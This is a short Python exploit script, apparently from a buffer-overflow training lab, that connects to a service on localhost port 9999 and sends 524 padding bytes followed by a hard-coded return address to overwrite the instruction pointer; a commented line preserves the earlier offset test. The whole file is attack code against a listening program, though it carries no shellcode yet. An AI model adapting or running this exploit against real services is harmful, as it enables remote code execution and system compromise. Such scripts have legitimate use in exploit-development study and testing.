import socket,sys


#payload = "A" * 524 + "B" * 4
payload = "A" * 524 + "\xF3\x12\x17\x31"

try: 
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('127.0.0.1',9999))
    s.recv(1024)
    s.send(payload)
    s.close()
except:
    print("[X] Connection error")
    sys.exit()